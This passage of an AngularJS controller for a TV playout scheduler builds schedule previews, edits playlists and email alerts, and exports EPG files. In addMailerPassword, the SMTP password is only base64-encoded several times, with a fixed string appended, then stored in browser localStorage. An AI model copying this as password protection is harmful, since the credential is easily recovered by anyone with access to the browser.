                if(!$scope.handleExisitingDaySlots(previewWeekly, slotDisplay)) {
                    previewWeekly.push(slotDisplay);
                }
            }
        }

        // propagate top colors down for empty slots to show program continuation
        for (let d = 1; d <= 7; d++) {
            let lastColor = "";
            for (let i = 0; i < previewWeekly.length; i++) {
                let daySlot = previewWeekly[i].slots[d];
                if (daySlot && daySlot.name) {
                    lastColor = daySlot.color;
                } else if (lastColor) {
                    previewWeekly[i].slots[d] = { color: lastColor, name: "" };
                }
            }
        }

        // Add previewDated
        for(let i = 0; i < dated.length; i++) {
            let slot = dated[i];
            angular.forEach(slot.dates, function(date, key) {
                let slotPreview = {};
                let sched = $scope.config.schedules[slot.id];
                slotPreview.color = slot.color;
                slotPreview.name = $scope.getSchedulePlaylistName(sched);
                slotPreview.at = date + " " + slot.start;
                slotPreview.hasRepeat = slot.hasRepeat;
                previewDated.push(slotPreview);
            });
        }
        previewDated.sort((a, b) => a.at > b.at ? 1 : -1);
        
        $scope.previewData = { "weekly": previewWeekly, "dated": previewDated };
    }

    $scope.handleExisitingDaySlots = function(existingSlots, slotDisplay) {
        let handled = false;
        for(let t = 0; t < existingSlots.length; t++) {
            if(existingSlots[t].start == slotDisplay.start) {
                for(let s = 0; s < slotDisplay.slots.length; s++) {
                    if($scope.isEmpty(existingSlots[t].slots[s])) {
                        existingSlots[t].slots[s] = slotDisplay.slots[s];
                        handled = true;
                    }
                }
            }
        }
        return handled;
    }

    $scope.handleExisitingDateSlots = function(existingSlots, slotDisplay) {
        let handled = false;
        for(let t = 0; t < existingSlots.length; t++) {
            
        }
        return handled;
    }

    $scope.printSlot = function(slot, day) {
        if(slot.days.includes(day)) {
            return $scope.getPlaylistName(slot.id);
        }
    }

    // color in #code format
    $scope.classifyColor = function(color, index, day) {
        if(!$scope.isEmpty(color) && !$scope.isEmpty($scope.previewData.weekly[index].slots[day])) {
            let claz = color.replace("#", "_");
            $scope.previewData.weekly[index].slots[day].claz = claz;
            $scope.previewData.weekly[index].slots[day].color = color;
        
            // color the next vacant slots with upper slot
            for(let i = index + 1; i < $scope.previewData.weekly.length; i++) {
                if(!$scope.isEmpty($scope.previewData.weekly[i].slots[day]) && !$scope.isEmpty($scope.previewData.weekly[i].slots[day].name)) {//available slot, breakout
                    break;
                }
                if($scope.isEmpty($scope.previewData.weekly[i].slots[day])) {
                    $scope.previewData.weekly[i].slots[day] = {claz: claz, color: color};
                } else {
                    $scope.previewData.weekly[i].slots[day].claz = claz;
                    $scope.previewData.weekly[i].slots[day].color = color;
                }
            }
        }
    }

    $scope.addMailerPassword = function() {
        let pass = jQuery("#pswd").val();
        if($scope.invalidMailer()) {
            alert("Please enter all Sender's details including password!");
        } else {
            $scope.modifying();
            // 1st: 2nd
            let hash = B.encode(B.encode("VGhhbmtzRm9yVXNpbmdUZWxlZnluYSwgV2UgbGF1Y2hlZCBUZWxlZnluYSBpbiAyMDIxIGJ5IEdvZCdzIGdyYWNl"));// 5
            pass = B.encode(B.encode(B.encode(B.encode(B.encode(pass))))) + hash + Math.floor((Math.random() * 9) + 1);
            if(!$scope.isEmpty(pass) && !$scope.isEmpty($scope.config.alerts.mailer.email) && !$scope.isEmpty($scope.config.alerts.mailer.port) && !$scope.isEmpty($scope.config.alerts.mailer.host) && !$scope.isEmpty($scope.config.alerts.subscribers)) {
                $scope.config.alerts.mailer.pass = pass;
                window.localStorage.config = JSON.stringify($scope.config);
                $scope.clear();
            } else {
                alert("Enter valid information!");
            }
        }
    }

    $scope.deleteReceivers = function() {
        let receivers = jQuery('.receiver:checked');
        if(receivers.length == 0) {
            alert("Select Receivers to delete");
        } else {
            $scope.modifying();
            if(confirm("Do you want to proceed with Deleting Selected Receivers?")) {
                for(let i = 0; i < receivers.length; i++) {
                    delete $scope.config.alerts.subscribers[receivers[i].value];
                }
                // remove empty
                $scope.config.alerts.subscribers = $scope.config.alerts.subscribers.filter(function(el) {
                    return el;
                });
                window.localStorage.config = JSON.stringify($scope.config);
            }
        }
    }

    $scope.addAlert = function() {
        $scope.modifying();
        if($scope.alert.eventCategory != 'ADMIN') {
            $scope.alert.attachConfig = false;
            $scope.alert.attachAuditLog = 0;
        }
        $scope.config.alerts.subscribers.push($scope.alert);
        window.localStorage.config = JSON.stringify($scope.config);
    }

    function validEmail(email) {
        const reg = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return reg.test(String(email).toLowerCase());
    }

    $scope.invalidMailer = function() {
        return $scope.isEmpty(jQuery("#pswd").val()) || $scope.isEmpty($scope.config.alerts.mailer.port) || $scope.isEmpty($scope.config.alerts.mailer.host) || !validEmail($scope.config.alerts.mailer.email);
    }

    $scope.invalidSubScriber = function() {
        let emails = $scope.alert.emails.split("#");
        for(let i = 0; i < emails.length; i++) {
            if(!validEmail(emails[i].split())) {
                return true;
            }
        }
        return false;
    }

    $scope.getPlaylistTypeDesc = function(category) {
        if(category == "ONLINE") {
            return "An Online streaming playlist using a stream url with NO support for bumper";
        } else if(category == "LOCAL_SEQUENCED") {
            return "A local playlist starting from the first to the last alphabetical program by file naming with support for bumpers";
        } else if(category == "LOCAL_RANDOMIZED") {
            return "A local playlist randlomy selecting programs with support for bumpers";
        } else if(category == "LOCAL_RESUMING") {
            return "A local playlist resuming from the previous program at exact stopped time with NO support for bumper";
        } else if(category == "LOCAL_RESUMING_ONE") {
            return "A local one program selection playlist resuming from the next program with NO support for bumper";
        } else if(category == "LOCAL_RESUMING_SAME") {
            return "A local playlist restarting the previous non completed program on the next playout with NO support for bumper";
        } else if(category == "LOCAL_RESUMING_NEXT") {
            return "A local playlist resuming from the next program with NO support for bumper";
        }
    }

        $scope.deleteSelectedSchedule = function() {
        if (!$scope.isEmpty($scope.editingSchedule)) {
            let index = parseInt($scope.editingSchedule);
            if ($scope.config.schedules && $scope.config.schedules[index]) {
                if (confirm("Do you want to proceed with deleting this schedule?")) {
                    $scope.modifying();
                    $scope.config.schedules.splice(index, 1);
                    window.localStorage.config = JSON.stringify($scope.config);
                    $scope.clear();
                }
            }
        }
    };

    $scope.deleteAllSchedules = function() {
        if (!$scope.config.schedules || $scope.config.schedules.length === 0) {
            alert("There are no schedules to delete!");
            return;
        }
        if (confirm("Do you want to proceed with deleting all existing schedules?")) {
            $scope.modifying();
            $scope.config.schedules = [];
            window.localStorage.config = JSON.stringify($scope.config);
            $scope.clear();
        }
    };

    // Color Swatch Grid Selection
    $scope.availableColors = [
        "#00cc99", "#00ccff", "#6666ff", "#28a745", "#ffff66", "#66ff33",
        "#ff6600", "#ff33cc", "#666699", "#e0ebeb", "#990099", "#993333",
        "#808080", "#ccccff", "#336600", "#99ff99", "#66ffcc", "#ccffcc",
        "#ffccff", "#0060aa", "#f9b724", "#775549", "#2c0f7d", "#607d8b"
    ];

    $scope.selectColorSwatch = function(colorHex) {
        if (!$scope.playlist) $scope.playlist = {};
        $scope.playlist.color = colorHex;
        if ($scope.changeSelectedColor) {
            $scope.changeSelectedColor();
        }
    };

    // Tab Navigation & Theme Management
    $scope.activeTab = 'general';
    $scope.theme = window.localStorage.theme || 'dark';
    document.documentElement.setAttribute('data-theme', $scope.theme);
    document.documentElement.setAttribute('data-bs-theme', $scope.theme);

    // Helper to select a playlist for editing from the sidebar list
    function ensureGraphicsTemplate(sourceGraphics) {
        let g = sourceGraphics ? JSON.parse(JSON.stringify(sourceGraphics)) : {};
        if (g.displayLogo === undefined) g.displayLogo = false;
        if (g.logoPosition === undefined) g.logoPosition = "TOP";
        if (g.displayLiveLogo === undefined) g.displayLiveLogo = false;
        if (g.displayRepeatWatermark === undefined) g.displayRepeatWatermark = false;
        if (!g.news) g.news = {};
        if (g.news.startMinute === undefined) g.news.startMinute = 0.0;
        if (g.news.messages === undefined) g.news.messages = "";
        if (!g.lowerThirds) g.lowerThirds = [];
        return g;
    }

    $scope.scheduleNew = function(index) {
        $scope.clear();
        $scope.schedule = String(index);
        $scope.editingSchedule = undefined;
        $scope.edit = undefined;
        
        let basePl = $scope.config.playlists[index];
        if (basePl) {
            $scope.playlist.active = basePl.active !== false;
            $scope.playlist.type = basePl.type || "ONLINE";
            $scope.playlist.name = basePl.name || "";
            $scope.playlist.color = basePl.color || "";
            $scope.playlist.emptyReplacer = basePl.emptyReplacer !== undefined ? basePl.emptyReplacer : 0;
            $scope.playlist.seekTo = basePl.seekTo ? JSON.parse(JSON.stringify(basePl.seekTo)) : {program: 0, position: 0};
            $scope.playlist.graphics = ensureGraphicsTemplate(basePl.graphics);
            if (!$scope.ui) $scope.ui = {};
            $scope.ui.newsMsgText = ($scope.playlist.graphics.news && $scope.playlist.graphics.news.messages) 
                ? $scope.playlist.graphics.news.messages.split("~~").join("\n") 
                : "";
        }
        
        window.scrollTo(0, 0);
    };

    $scope.editSchedule = function(index) {
        if (index === undefined) {
            $scope.editingSchedule = undefined;
            $scope.clear();
        } else {
            $scope.editingSchedule = String(index);
            let sched = $scope.config.schedules[index];
            if (!sched) return;
            
            let plIndex = $scope.config.playlists.findIndex(p => p.id === sched.playlistId);
            let basePl = plIndex !== -1 ? $scope.config.playlists[plIndex] : null;
            $scope.schedule = plIndex !== -1 ? String(plIndex) : undefined;
            
            // Priority: If schedule has its own custom graphics saved, use them.
            // Otherwise, prefill from the parent playlist's default graphics.
            let rawGraphics = sched.graphics ? sched.graphics : (basePl ? basePl.graphics : null);
            
            $scope.playlist = {
                active: sched.active !== false,
                type: sched.type || (basePl ? (basePl.type || "ONLINE") : "ONLINE"),
                name: sched.name || (basePl ? basePl.name : ""),
                color: sched.color || (basePl ? basePl.color : ""),
                emptyReplacer: sched.emptyReplacer !== undefined ? sched.emptyReplacer : (basePl ? basePl.emptyReplacer : 0),
                seekTo: sched.seekTo ? JSON.parse(JSON.stringify(sched.seekTo)) : (basePl && basePl.seekTo ? JSON.parse(JSON.stringify(basePl.seekTo)) : {program: 0, position: 0}),
                start: sched.start,
                days: sched.days ? JSON.parse(JSON.stringify(sched.days)) : [],
                dates: sched.dates ? JSON.parse(JSON.stringify(sched.dates)) : [],
                graphics: ensureGraphicsTemplate(rawGraphics)
            };
            
            if (!$scope.ui) $scope.ui = {};
            $scope.ui.newsMsgText = ($scope.playlist.graphics.news && $scope.playlist.graphics.news.messages) 
                ? $scope.playlist.graphics.news.messages.split("~~").join("\n") 
                : "";
            
            $scope.edit = undefined;
            window.scrollTo(0, 0);
        }
    };

    $scope.editPlaylist = function(index) {
        if (index === undefined) {
            $scope.edit = undefined;
            $scope.clear();
        } else {
            $scope.edit = String(index);
            $scope.renderEdit();
        }
    };
    document.documentElement.setAttribute('data-theme', $scope.theme);

    $scope.setTab = function(tabName) {
        if ($scope.activeTab !== tabName) {
            $scope.clear();
        }
        $scope.activeTab = tabName;
        $scope.isSidebarOpen = false;
    };

    $scope.toggleTheme = function() {
        $scope.theme = ($scope.theme === 'dark') ? 'light' : 'dark';
        window.localStorage.theme = $scope.theme;
        document.documentElement.setAttribute('data-theme', $scope.theme);
        document.documentElement.setAttribute('data-bs-theme', $scope.theme);
    };

    // Playlist Types Card List Definition with Font Awesome Vector Icons
    $scope.playlistTypes = [
        { key: "ONLINE", iconClass: "fa-solid fa-tower-cell", title: "Online Stream", desc: "Live HLS / RTMP stream URL with graphics overlays." },
        { key: "LOCAL_SEQUENCED", iconClass: "fa-solid fa-folder-tree", title: "Local Sequenced", desc: "Plays media files alphabetically from folder with bumpers." },
        { key: "LOCAL_RANDOMIZED", iconClass: "fa-solid fa-shuffle", title: "Local Randomized", desc: "Shuffles and randomly selects media files from folder." },
        { key: "LOCAL_RESUMING", iconClass: "fa-solid fa-circle-play", title: "Local Resuming", desc: "Resumes previous media file at exact stopped timestamp." },
        { key: "LOCAL_RESUMING_SAME", iconClass: "fa-solid fa-rotate-left", title: "Resuming Same", desc: "Restarts non-completed media file on next playout cycle." },
        { key: "LOCAL_RESUMING_NEXT", iconClass: "fa-solid fa-forward-step", title: "Resuming Next", desc: "Advances to next media file in folder on playout." },
        { key: "LOCAL_RESUMING_ONE", iconClass: "fa-solid fa-1", title: "Resuming One Program", desc: "Plays one program per scheduled period (daily/weekly/monthly)." }
    ];

    $scope.selectPlaylistType = function(typeKey) {
        if (!$scope.playlist) $scope.playlist = {};
        $scope.playlist.type = typeKey;
        if (typeKey === 'LOCAL_RESUMING_ONE' && !$scope.playlist.repeat) {
            $scope.playlist.repeat = 'DAILY';
        }
    };

    // Date Chips Picker Helpers
    $scope.customDateInput = "";

    $scope.addDateChip = function() {
        if (!$scope.customDateInput) return;
        
        let target = $scope.customDateInput;
        if (target instanceof Date && !isNaN(target)) {
            let dayStr = String(target.getDate()).padStart(2, '0');
            let monthStr = String(target.getMonth() + 1).padStart(2, '0');
            let yearStr = target.getFullYear();
            let formatted = `${dayStr}/${monthStr}/${yearStr}`; // Using standard DD/MM/YYYY format
            
            if (!$scope.playlist) $scope.playlist = {};
            if (!$scope.playlist.dates) $scope.playlist.dates = [];
            if (!$scope.playlist.dates.includes(formatted)) {
                $scope.playlist.dates.push(formatted);
            }
        } else if (typeof target === 'string') {
            let parts = target.split("-");
            if (parts.length === 3) {
                let formatted = `${parts[2]}/${parts[1]}/${parts[0]}`;
                if (!$scope.playlist) $scope.playlist = {};
                if (!$scope.playlist.dates) $scope.playlist.dates = [];
                if (!$scope.playlist.dates.includes(formatted)) {
                    $scope.playlist.dates.push(formatted);
                }
            }
        }
        $scope.customDateInput = null;
    };

    $scope.removeDateChip = function(index) {
        if ($scope.playlist && $scope.playlist.dates) {
            $scope.playlist.dates.splice(index, 1);
        }
    };

    $scope.addQuickDate = function(offsetDays) {
        let target = new Date();
        target.setDate(target.getDate() + offsetDays);
        let dayStr = String(target.getDate()).padStart(2, '0');
        let monthStr = String(target.getMonth() + 1).padStart(2, '0');
        let yearStr = target.getFullYear();
        let formatted = `${dayStr}/${monthStr}/${yearStr}`;
        
        if (!$scope.playlist) $scope.playlist = {};
        if (!$scope.playlist.dates) $scope.playlist.dates = [];
        if (!$scope.playlist.dates.includes(formatted)) {
            $scope.playlist.dates.push(formatted);
        }
    };

    // Modern Day Chips Selection logic
    $scope.dayOptions = [
        { val: 1, label: 'Sun' },
        { val: 2, label: 'Mon' },
        { val: 3, label: 'Tue' },
        { val: 4, label: 'Wed' },
        { val: 5, label: 'Thu' },
        { val: 6, label: 'Fri' },
        { val: 7, label: 'Sat' }
    ];

    $scope.isDaySelected = function(dayVal) {
        if (!$scope.playlist || !$scope.playlist.days) return false;
        return $scope.playlist.days.map(Number).includes(Number(dayVal));
    };

    $scope.toggleDayChip = function(dayVal) {
        if (!$scope.playlist) $scope.playlist = {};
        if (!$scope.playlist.days) $scope.playlist.days = [];
        let num = Number(dayVal);
        let idx = $scope.playlist.days.map(Number).indexOf(num);
        if (idx > -1) {
            $scope.playlist.days.splice(idx, 1);
        } else {
            $scope.playlist.days.push(num);
            $scope.playlist.days.sort();
        }
    };

    $scope.selectQuickDays = function(mode) {
        if (!$scope.playlist) $scope.playlist = {};
        if (mode === 'ALL') {
            $scope.playlist.days = [1, 2, 3, 4, 5, 6, 7];
        } else if (mode === 'WEEKDAYS') {
            $scope.playlist.days = [2, 3, 4, 5, 6];
        } else if (mode === 'WEEKENDS') {
            $scope.playlist.days = [1, 7];
        } else if (mode === 'CLEAR') {
            $scope.playlist.days = [];
        }
    };

    // News Ticker Message Textarea Logic
    if (!$scope.ui) $scope.ui = {};
    $scope.ui.newsMsgText = "";

    $scope.updateNewsMsgs = function() {
        if (!$scope.playlist) $scope.playlist = {};
        if (!$scope.playlist.graphics) $scope.playlist.graphics = {};
        if (!$scope.playlist.graphics.news) $scope.playlist.graphics.news = {};
        $scope.playlist.graphics.news.messages = ($scope.ui && $scope.ui.newsMsgText ? $scope.ui.newsMsgText : "").split("\n").map(s => s.trim()).filter(s => s.length > 0).join("~~");
    };

    // EPG / DVR Schedule Export (mySDAtv Specification)
    $scope.epgFormat = "TSV";
    $scope.epgDaysRange = "14";

        $scope.downloadEPGFile = function() {
        let daysCount = parseInt($scope.epgDaysRange) || 14;
        let format = $scope.epgFormat || "TSV";
        let isTsv = (format === "TSV");
        let sep = isTsv ? "	" : ",";

        // Build list of active scheduled slots from the schedules array
        let activeSchedules = [];
        if ($scope.config.schedules) {
            angular.forEach($scope.config.schedules, function(s, key) {
                if (s.start && s.active !== false) {
                    let days = s.days && s.days.length ? s.days.map(Number) : [1, 2, 3, 4, 5, 6, 7];
                    let basePl = $scope.config.playlists ? $scope.config.playlists.find(p => p.id === s.playlistId) : null;
                    let desc = (basePl ? basePl.description : null) || "TBA";
                    let name = s.name || (basePl ? basePl.name : "Program");
                    
                    activeSchedules.push({
                        key: key,
                        name: name.toUpperCase(),
                        description: desc,
                        start: s.start, // "HH:mm"
                        days: days,
                        dates: s.dates || []
                    });
                }
            });
        }

        activeSchedules.sort((a, b) => a.start.localeCompare(b.start));

        let rows = [];
        rows.push(["Date (DD-MM-YYYY)", "Start Time (HH:mm:ss)", "Duration (HH:mm:ss)", "Title", "Playlist Description"].join(sep));
        let startDate = new Date();

        for (let d = 0; d < daysCount; d++) {
            let targetDate = new Date(startDate.getTime() + d * 24 * 60 * 60 * 1000);
            let dayOfWeek = targetDate.getDay() + 1; // 1=Sun, 7=Sat
            let dayStr = String(targetDate.getDate()).padStart(2, '0');
            let monthStr = String(targetDate.getMonth() + 1).padStart(2, '0');
            let yearStr = targetDate.getFullYear();
            let dateFormatted = `${dayStr}-${monthStr}-${yearStr}`; // DD-MM-YYYY

            // Find schedules for this day (checking both generic days and specific dates)
            let daySlots = activeSchedules.filter(s => {
                let isDayMatch = s.days && s.days.includes(dayOfWeek);
                let isDateMatch = s.dates && s.dates.includes(dateFormatted);
                return isDayMatch || isDateMatch;
            });
            
            if (daySlots.length === 0 && $scope.config.playlists && $scope.config.playlists.length > 0) {
                // Default fallback slot (first playlist)
                daySlots = [{
                    name: ($scope.config.playlists[0].name || "DEFAULT").toUpperCase(),
                    description: $scope.config.playlists[0].description || "TBA",
                    start: "00:00"
                }];
            } else {
                // Sort day slots explicitly in case time dictates order
                daySlots.sort((a, b) => a.start.localeCompare(b.start));
            }

            for (let i = 0; i < daySlots.length; i++) {
                let slot = daySlots[i];
                let startTimeStr = slot.start.length === 5 ? slot.start + ":00" : slot.start; // HH:mm:ss
                let durationStr = "00:30:00"; // Default slot duration

                if (i < daySlots.length - 1) {
                    let nextSlot = daySlots[i + 1];
                    let [h1, m1] = slot.start.split(":").map(Number);
                    let [h2, m2] = nextSlot.start.split(":").map(Number);
                    let diffMins = (h2 * 60 + m2) - (h1 * 60 + m1);
                    if (diffMins > 0) {
                        let durH = String(Math.floor(diffMins / 60)).padStart(2, '0');
                        let durM = String(diffMins % 60).padStart(2, '0');
                        durationStr = `${durH}:${durM}:00`;
                    }
                }

                let rowStr = [dateFormatted, startTimeStr, durationStr, slot.name, slot.description].join(sep);
                rows.push(rowStr);
            }
        }

        let fileContent = rows.join("\n");
        let filename = `3ABN_Uganda_EPG_Schedule_${daysCount}Days.${isTsv ? 'tsv' : 'csv'}`;
        let mimeType = isTsv ? 'text/tab-separated-values' : 'text/csv';

        let blob = new Blob([fileContent], { type: mimeType });
        let downloadLink = document.createElement("a");
        downloadLink.download = filename;
        downloadLink.href = window.URL.createObjectURL(blob);
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
        downloadLink.click();
        document.body.removeChild(downloadLink);
    };

    // Client-side JSON Schema Validation
    $scope.validateConfigSchema = function(cfg) {
        if (!cfg) return { valid: false, error: "Configuration object is empty." };
        if (!cfg.playlists || !Array.isArray(cfg.playlists)) {
            return { valid: false, error: "Configuration must contain a 'playlists' array." };
        }
        if (cfg.wait !== undefined && typeof cfg.wait !== 'number') {
            return { valid: false, error: "'wait' parameter must be a number." };
        }
        return { valid: true };
    };

});